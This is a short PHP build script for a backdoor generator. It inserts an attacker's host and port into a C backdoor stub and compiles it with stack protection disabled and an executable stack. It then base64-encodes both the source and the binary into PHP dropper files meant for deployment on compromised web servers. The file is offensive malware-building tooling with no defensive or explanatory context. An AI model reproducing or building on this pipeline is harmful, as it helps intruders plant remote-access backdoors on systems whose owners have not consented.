<?php
include("./config.php");

@system("rm -rf ./build; mkdir ./build");

$stub_c = file_get_contents("./stub/backdoor.c");

$c = str_replace("{hostname}", $host, $stub_c);
$c = str_replace("{port}", $port, $c);

file_put_contents("./build/backdoor.c", $c);

system("gcc -g -Wall -fno-stack-protector -z execstack ./build/backdoor.c -o ./build/backdoor");

$stub_php_c = file_get_contents("./stub/backdoor_c.php");

$php_c = str_replace("{source}", base64_encode($c), $stub_php_c);

file_put_contents("./build/backdoor_c.php", $php_c);

$bin = file_get_contents("./build/backdoor");

$stub_php_bin = file_get_contents("./stub/backdoor_bin.php");

$php_bin = str_replace("{bin}", base64_encode($bin), $stub_php_bin);

file_put_contents("./build/backdoor_bin.php", $php_bin);